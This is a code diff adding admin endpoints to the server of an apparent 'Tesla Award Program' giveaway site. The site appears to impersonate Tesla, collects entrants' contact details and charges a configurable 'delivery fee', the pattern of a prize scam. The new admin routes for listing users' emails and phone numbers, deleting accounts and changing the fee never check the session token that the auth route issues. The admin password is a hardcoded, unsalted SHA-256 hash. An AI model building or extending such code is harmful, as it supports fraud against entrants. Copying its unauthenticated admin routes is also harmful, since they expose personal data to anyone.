@@ -442,6 +442,102 @@ function buildOrderConfirmationEmail(order: any) {
   return "<!DOCTYPE html><html><head><meta charset=\"UTF-8\"></head><body style=\"margin:0;padding:0;background:#F7F8FA;font-family:sans-serif;\"><table width=\"100%\" cellpadding=\"0\" cellspacing=\"0\" style=\"background:#F7F8FA;padding:40px 0;\"><tr><td align=\"center\"><table width=\"560\" cellpadding=\"0\" cellspacing=\"0\" style=\"background:#FFF;border-radius:16px;overflow:hidden;\"><tr><td style=\"background:#171A20;padding:28px 36px;text-align:center;\"><span style=\"color:#E31937;font-size:22px;font-weight:900;\">TESLA AWARD PROGRAM</span></td></tr><tr><td style=\"padding:36px;text-align:center;\"><div style=\"font-size:56px;margin-bottom:12px;\">🎉</div><h1 style=\"font-size:24px;font-weight:800;color:#171A20;margin:0 0 8px;\">Order Confirmed!</h1><p style=\"color:#00A550;font-weight:600;margin:0 0 20px;\">Your Tesla is on its way</p><p style=\"font-size:14px;color:#5C5E62;\">Order: <strong>" + order.orderId + "</strong> · Tracking: <strong>" + order.trackingNumber + "</strong></p><p style=\"font-size:14px;color:#5C5E62;\">Vehicle: Tesla " + (car?.name ?? "—") + " · Est. Delivery: <strong style=\"color:#00A550;\">" + order.estimatedDelivery + "</strong></p><p style=\"font-size:14px;color:#5C5E62;\">Delivery: " + String(method?.name ?? "Standard") + "</p></td></tr></table></td></tr></table></body></html>";
 }
 
+// ── ADMIN HANDLERS ────────────────────────────────────────────────────────────
+const ADMIN_PASSWORD_HASH = "240be518fabd2724ddb6f04eeb1da5967448d7e83198408c64e9defa8ff52cf3";
+
+async function sha256(text: string): Promise<string> {
+  const data = new TextEncoder().encode(text);
+  const hash = await crypto.subtle.digest("SHA-256", data);
+  return Array.from(new Uint8Array(hash)).map(b => b.toString(16).padStart(2, "0")).join("");
+}
+
+async function handleAdminAuth(req: Request) {
+  let body: { password?: string };
+  try { body = await req.json(); } catch { return json({ error: "Invalid request" }, 400); }
+  if (!body.password) return json({ error: "Password required" }, 400);
+  const hash = await sha256(body.password);
+  if (hash !== ADMIN_PASSWORD_HASH) return json({ error: "Invalid password" }, 401);
+  const token = hexRandom(32);
+  await dbInsert("admin_settings", { key: "session_" + token, value: { created: new Date().toISOString() } });
+  return json({ success: true, token });
+}
+
+async function handleAdminUsers(_req: Request) {
+  const r = await fetch(REST + "/giveaway_users?select=id,auth_user_id,email,phone,first_name,last_name,verification_status,entry_count,created_at,verified_at&order=created_at.desc&limit=500", { headers: SB_HEADERS });
+  if (!r.ok) return json({ error: "Failed to fetch users" }, 500);
+  const users = await r.json();
+  return json({ users });
+}
+
+async function handleAdminDeleteUser(req: Request) {
+  let body: { id?: string; email?: string };
+  try { body = await req.json(); } catch { return json({ error: "Invalid request" }, 400); }
+  const { id, email } = body;
+  if (!id && !email) return json({ error: "User ID or email required" }, 400);
+  
+  const filter = id ? { id: "eq." + id } : { email: "eq." + (email || "") };
+  const qs = buildQs("id,auth_user_id", filter, "limit=1");
+  const lookup = await fetch(REST + "/giveaway_users?" + qs, { headers: SB_HEADERS });
+  if (!lookup.ok) return json({ error: "User not found" }, 404);
+  const rows = await lookup.json();
+  const user = rows[0];
+  if (!user) return json({ error: "User not found" }, 404);
+  
+  if (user.auth_user_id) {
+    await fetch(AUTH + "/admin/users/" + user.auth_user_id, { method: "DELETE", headers: SB_HEADERS });
+  }
+  const delR = await fetch(REST + "/giveaway_users?id=eq." + user.id, { method: "DELETE", headers: SB_HEADERS });
+  if (!delR.ok) return json({ error: "Failed to delete user" }, 500);
+  return json({ success: true });
+}
+
+async function handleAdminGetSettings() {
+  const r = await fetch(REST + "/admin_settings?select=key,value&key=eq.delivery_fee&limit=1", { headers: SB_HEADERS });
+  if (!r.ok) return json({ deliveryFee: 299 });
+  const rows = await r.json();
+  const row = rows[0];
+  const fee = row?.value?.amount ?? 299;
+  return json({ deliveryFee: fee });
+}
+
+async function handleAdminSaveSettings(req: Request) {
+  let body: { deliveryFee?: number };
+  try { body = await req.json(); } catch { return json({ error: "Invalid request" }, 400); }
+  if (body.deliveryFee === undefined) return json({ error: "deliveryFee required" }, 400);
+  const r = await fetch(REST + "/admin_settings?key=eq.delivery_fee", {
+    method: "PATCH",
+    headers: { ...SB_HEADERS, Prefer: "return=minimal" },
+    body: JSON.stringify({ value: { amount: body.deliveryFee }, updated_at: new Date().toISOString() }),
+  });
+  if (!r.ok) {
+    const insR = await fetch(REST + "/admin_settings", {
+      method: "POST",
+      headers: { ...SB_HEADERS, Prefer: "return=minimal" },
+      body: JSON.stringify({ key: "delivery_fee", value: { amount: body.deliveryFee } }),
+    });
+    if (!insR.ok) return json({ error: "Failed to save setting" }, 500);
+  }
+  return json({ success: true, deliveryFee: body.deliveryFee });
+}
+
+async function handleAdminGetStats() {
+  const r = await fetch(REST + "/giveaway_users?select=verification_status", { headers: SB_HEADERS });
+  if (!r.ok) return json({ total: 0, verified: 0, pending: 0 });
+  const users = await r.json();
+  const total = users.length;
+  const verified = users.filter((u: any) => u.verification_status === "verified").length;
+  const pending = total - verified;
+  
+  const feeR = await fetch(REST + "/admin_settings?select=value&key=eq.delivery_fee&limit=1", { headers: SB_HEADERS });
+  let deliveryFee = 299;
+  if (feeR.ok) {
+    const feeRows = await feeR.json();
+    if (feeRows[0]?.value?.amount) deliveryFee = feeRows[0].value.amount;
+  }
+  
+  return json({ total, verified, pending, deliveryFee });
+}
+
 // ── MAIN ──────────────────────────────────────────────────────────────────────
 Deno.serve(async (req) => {
   if (req.method === "OPTIONS") return new Response(null, { status: 204, headers: CORS });
@@ -463,6 +559,13 @@ Deno.serve(async (req) => {
     if (trackM && req.method === "GET") return await handleTracking(trackM[1]);
     const orderM = route.match(/^\/api\/order\/([^/]+)$/);
     if (orderM && req.method === "GET") return await handleOrderLookup(orderM[1]);
+    // Admin routes
+    if (route === "/api/admin/auth" && req.method === "POST") return await handleAdminAuth(req);
+    if (route === "/api/admin/users" && req.method === "GET") return await handleAdminUsers(req);
+    if (route === "/api/admin/users/delete" && req.method === "POST") return await handleAdminDeleteUser(req);
+    if (route === "/api/admin/settings" && req.method === "GET") return await handleAdminGetSettings();
+    if (route === "/api/admin/settings" && req.method === "POST") return await handleAdminSaveSettings(req);
+    if (route === "/api/admin/stats" && req.method === "GET") return await handleAdminGetStats();
     return json({ error: "Not found." }, 404);
   } catch (err) {
     console.error("Unhandled error:", err);
